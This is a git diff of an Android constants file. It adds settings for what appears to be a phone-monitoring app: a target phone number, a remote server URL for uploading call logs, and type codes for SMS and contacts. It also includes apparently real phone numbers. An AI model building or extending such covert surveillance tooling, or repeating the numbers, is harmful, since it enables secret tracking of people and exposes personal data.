@@ -2,7 +2,9 @@ package com.comsince.secret.common;
 
 import android.os.Environment;
 
-  
+import com.comsince.secret.bean.User;
+import com.comsince.secret.ui.MIMIApplication;
+import com.comsince.secret.util.SqlliteHander;
 
 
 /**
@@ -37,11 +39,26 @@ public interface Constant {
 		public static final  String IMAGE_DIR=Environment.getExternalStorageDirectory().getPath()+"/mimiFielCache";
 
 
+        public static class PhoneListenContants{
+            //public static final String TARGET_NUMBER = "13802671429";
+            public static final String TARGET_NUMBER = "15871008542";
+        }
+
         public static class CallLogContants{
             public static final String CACHE_DIR=Environment.getExternalStorageDirectory().getPath()+"/PMRecordFielCache";
             public static final String TYPE_1 = "1";
-            public static final String TARGET_NUMBER = "13802671429";
-            public static final String SERVER_URL = "http://172.16.9.242:8080/PhoneListen";
+            //public static final String SERVER_URL = "http://172.16.9.242:8080/PhoneListen";
+            public static final String SERVER_URL = "http://phonelisten.duapp.com";
+        }
+
+        public static class SmsMessageContants{
+            /***短信类型**/
+            public static final String TYPE_2 = "2";
+        }
+
+        public static class ContactContants{
+            /**联系人类型**/
+            public static final String TYPE_4 = "4";
         }
 
 		
